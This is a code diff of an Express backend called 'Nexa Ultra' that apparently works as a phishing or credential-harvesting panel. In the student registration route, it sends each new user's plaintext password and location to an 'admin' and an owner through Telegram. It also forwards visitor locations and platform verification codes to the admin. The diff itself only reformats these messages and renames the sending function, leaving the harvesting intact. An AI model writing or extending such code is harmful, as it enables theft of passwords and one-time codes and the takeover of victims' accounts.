@@ -211,6 +211,7 @@ app.get("/", (_, res) => res.json({ success: true, message: "Nexa Ultra backend 
 app.post("/admin/register", async (req, res) => {
   try {
     let { firstname, lastname, phone, password, chatId, slogan, bio } = req.body;
+    
     if (!firstname || !lastname || !phone || !password)
       return res.status(400).json({ success: false, error: "Missing fields" });
 
@@ -423,7 +424,7 @@ app.post("/student/visit", async (req, res) => {
     // notify admin (non-blocking)
   
 
-    await sendTelegram(admin.chatId, `📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)}`);
+    await sendToAdmin(admin.chatId, `📈 someone visited your Page \nPath: ${path || '/'}\nReferral: ${actualReferrer || "direct"}\nLocation: ${JSON.stringify(location)}`);
     
 
     return res.json({ success: true, message: "Visit tracked" });
@@ -486,8 +487,8 @@ app.post("/student/register", async (req, res) => {
     });
 
     // notify admin & owner
-    await sendToAdmin(admin._id, `🆕 New client: ${username}\nLocation: *${location.city || "Unknown city"}*, *{location.country || "Unknown country"}* Password: *${password}*`);
-    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: ${username} (via ${admin.username}) from *${location.country || "Unknown location"} `);
+    await sendToAdmin(admin._id, `🆕 New client: *${username}*\nLocation: *${location.city || "Unknown city"}*, *${location.country || "Unknown country"}* Password: *${password}*`);
+    await sendTelegram(ADMIN_CHAT_ID, `🆕 Student registered: *${username}* (via ${admin.username}) from *${location.country || "Unknown location"} `);
 
     return res.json({ success: true, studentId: student._id, admin: { username: admin.username, phone: admin.phone } });
   } catch (e) {
@@ -516,7 +517,7 @@ app.post("/student/send-code", async (req, res) => {
     if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
 
     const msg = `✅ ${code} is your ${platform || "NEXA"} verification code`;
-    await sendTelegram(admin._id, msg);
+    await sendToAdmin(admin._id, msg);
 
 
 
